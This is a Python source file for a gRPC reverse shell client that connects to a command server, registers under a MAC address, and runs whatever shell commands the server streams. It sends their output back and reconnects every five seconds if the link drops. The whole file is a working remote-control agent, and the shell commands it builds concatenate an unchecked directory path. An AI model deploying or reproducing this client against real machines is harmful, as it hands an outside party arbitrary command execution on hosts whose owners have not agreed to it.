import grpc
import reverse_shell_pb2
import reverse_shell_pb2_grpc
import subprocess
import asyncio
import logging
import time

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

class ReverseShellClient:
    def __init__(self, mac_address):
        self.channel = None
        self.stub = None
        self.connected = False
        self.mac_address = mac_address
        self.current_task = None
        self.stop_event = asyncio.Event()
        self.current_process = None
        self.current_directory = "/"  # Track the current working directory

    async def start(self):
        logging.info("Client start method initiated.")
        self.channel = grpc.aio.insecure_channel('localhost:50051')
        self.stub = reverse_shell_pb2_grpc.ReverseShellServiceStub(self.channel)

        while True:
            try:
                if not self.connected:
                    logging.info("Connecting to Reverse Shell gRPC server...")
                    await self.connect_to_server()
                else:
                    logging.info("Starting session with server.")
                    async for command_request in self.stub.StartSession(reverse_shell_pb2.ClientInfo(mac_address=self.mac_address)):
                        command = command_request.command.strip()
                        request_id = command_request.request_id
                        logging.info(f"Received command from server: {command}, Request ID: {request_id}")

                        if command.lower() == "ping":
                            await self.send_pong(request_id)
                        elif command.lower() == "stop":
                            logging.info("Stop command received, attempting to stop the running process.")
                            self.stop_event.set()
                            if self.current_task and not self.current_task.done():
                                await self.current_task
                            self.stop_event.clear()
                            self.current_task = None
                            self.current_process = None
                        else:
                            if self.current_task is None or self.current_task.done():
                                self.current_task = asyncio.create_task(self.handle_command(command, request_id))
            except grpc.RpcError as e:
                logging.error(f"Error in receiving commands: {e.details()}")
                self.connected = False
            except Exception as e:
                logging.error(f"Unexpected error: {str(e)}")
                self.connected = False
            await asyncio.sleep(5)  # Retry after delay if disconnected

    async def connect_to_server(self):
        await self.channel.channel_ready()
        self.connected = True
        logging.info("Connected to Reverse Shell gRPC server.")

    async def send_pong(self, request_id):
        response = reverse_shell_pb2.CommandResponse(
            request_id=request_id,
            output="pong",
            is_active=False,
            macAddress=self.mac_address
        )
        self.stub.StreamResponses(iter([response]))
        logging.info(f"Sent pong response for Request ID: {request_id}")

    async def handle_command(self, command, request_id):
            try:
                if self.stop_event.is_set():
                    logging.info(f"Stopping the previous command before executing new one.")
                    if self.current_process and self.current_process.returncode is None:
                        self.current_process.terminate()
                        await self.current_process.wait()
                    self.stop_event.clear()
                    self.current_task = None

                if command.startswith("cd "):
                    new_directory = command[3:].strip()
                    if new_directory == "..":
                        # Handle moving up a directory
                        self.current_directory = '/'.join(self.current_directory.rstrip('/').split('/')[:-1])
                        if not self.current_directory:
                            self.current_directory = '/'
                    else:
                        # Handle changing to a new directory
                        if not new_directory.startswith('/'):
                            new_directory = f"{self.current_directory}/{new_directory}"
                        self.current_directory = new_directory
                    logging.info(f"Changed directory to: {self.current_directory}")
                    # Send directory change response to the server
                    directory_change_response = reverse_shell_pb2.CommandResponse(
                        request_id=request_id,
                        output=f"Changed directory to: {self.current_directory}",
                        is_active=False,
                        macAddress=self.mac_address
                    )
                    async for _ in self.stub.StreamResponses(iter([directory_change_response])):
                        logging.info(f"Sent directory change response to server: {self.current_directory}")
                else:
                    async for output in self.execute_command(command):
                        response = reverse_shell_pb2.CommandResponse(
                            request_id=request_id,
                            output=output,
                            is_active=True,
                            macAddress=self.mac_address
                            )
                        async for _ in self.stub.StreamResponses(iter([response])):
                            logging.info(f"Sent command output to server for command: {command}")
            except asyncio.CancelledError:
                logging.info(f"Command {command} was cancelled.")
            finally:
                final_response = reverse_shell_pb2.CommandResponse(
                    request_id=request_id,
                    output="",
                    is_active=False,
                    macAddress=self.mac_address
                )
                self.stub.StreamResponses(iter([final_response]))
                logging.info("Command processing finished.")

    async def execute_command(self, command, timeout=30):
        logging.info(f"Executing command in directory {self.current_directory}: {command}")
        full_command = f"cd {self.current_directory} && {command}"
        self.current_process = await asyncio.create_subprocess_shell(
            full_command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        try:
            while self.current_process and not self.stop_event.is_set():
                line = await asyncio.wait_for(self.current_process.stdout.readline(), timeout=timeout)
                if not line:
                    break
                decoded_line = line.decode().strip()
                logging.info(f"Command stdout: {decoded_line}")
                yield decoded_line

            if self.current_process and not self.stop_event.is_set():
                stderr = await asyncio.wait_for(self.current_process.stderr.read(), timeout=timeout)
                if stderr:
                    decoded_stderr = stderr.decode().strip()
                    logging.info(f"Command stderr: {decoded_stderr}")
                    yield decoded_stderr
        finally:
            if self.current_process:
                if self.current_process.returncode is None:
                    self.current_process.terminate()
                    await self.current_process.wait()
                self.current_process = None
                logging.info("Process terminated.")

    async def close(self):
        if self.channel:
            await self.channel.close()

async def main():
    mac_address = '2C:54:91:88:C9:E3'  # Example MAC address, change accordingly for each client
    client = ReverseShellClient(mac_address)
    try:
        await client.start()
    except KeyboardInterrupt:
        logging.info("Shutting down client.")
        await client.close()

if __name__ == "__main__":
    asyncio.run(main())
